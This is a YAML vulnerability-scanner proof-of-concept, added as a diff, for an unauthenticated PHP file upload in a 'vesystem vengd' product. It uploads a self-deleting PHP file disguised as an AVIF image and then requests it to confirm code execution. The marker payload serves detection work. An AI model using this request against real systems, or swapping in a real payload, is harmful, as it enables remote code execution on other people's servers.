@@ -1,0 +1,41 @@
+name: yaml-poc-vesystem-vengd-file_upload-CT-474074
+binding: 6e9e867f-0ddb-4f19-a564-b1a1c8e70f62
+detail:
+    author: system_user
+    links:
+        - https://blog.csdn.net/qq_17754023/article/details/123174458
+    vulnerability:
+        id: 238abfd0-6af2-4395-acb8-6bf376899203
+        level: critical
+    warning: File Upload
+transport: http
+set:
+    rBoundary: randomLowercase(20)
+    rFilename: randomLowercase(10)
+    rPath: randomLowercase(5)
+    rContent: randomInt(10000000, 40000000)
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /Upload/upload_file.php?l={{rPath}}
+            headers:
+                Content-Type: multipart/form-data; boundary=----{{rBoundary}}
+            body: |-
+                ------{{rBoundary}}
+                Content-Disposition: form-data; name="file"; filename="{{rFilename}}.php"
+                Content-Type: image/avif
+
+                <?php echo md5({{rContent}});unlink(__FILE__);?>
+                ------{{rBoundary}}--
+            follow_redirects: false
+        expression: response.status == 200
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /Upload/{{rPath}}/{{rFilename}}.php
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(bytes(md5(string(rContent))))
+expression: r0() && r1()
